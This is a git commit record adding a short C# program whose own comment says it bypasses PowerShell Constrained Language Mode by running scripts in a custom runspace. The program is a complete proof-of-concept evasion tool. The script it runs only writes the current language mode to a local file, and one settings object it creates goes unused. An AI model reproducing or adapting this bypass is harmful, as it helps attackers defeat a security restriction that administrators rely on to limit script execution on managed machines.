6606b09a4d9968c8c215863abb9ff33110f40a4a
mta-quant <m.altaykan+quant@pm.me>
2026-04-23 22:01:06 +0100

    Squashed 'CustomRunspace/' content from commit 2df7a0e
    git-subtree-dir: CustomRunspace
    git-subtree-split: 2df7a0e3a0112d7296a8ab139f87a93e08c3197a

---
+++ Program.cs
@@ -0,0 +1,45 @@
+﻿/*
+Bypass PowerShell CLM by creating a custom runspace that can run PowerShell scripts.
+*/
+
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            InitialSessionState iss = InitialSessionState.CreateDefault();
+            iss.LanguageMode = PSLanguageMode.FullLanguage;
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+
+            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Users\\vex\\Dev\\CustomRunspace\\test.txt";
+
+            ps.AddScript(cmd);
+            ps.Invoke();
+
+            if (ps.Streams.Error.Count > 0)
+            {
+                foreach (var error in ps.Streams.Error)
+                {
+                    Console.WriteLine("[-] Error: " + error.ToString());
+                }
+            }
+            else
+            {
+                // Log the output to the terminal 
+                Console.WriteLine("[+] Command exeucted successfully!");
+
+            }
+
+            rs.Close();
+        }
+    }
+}
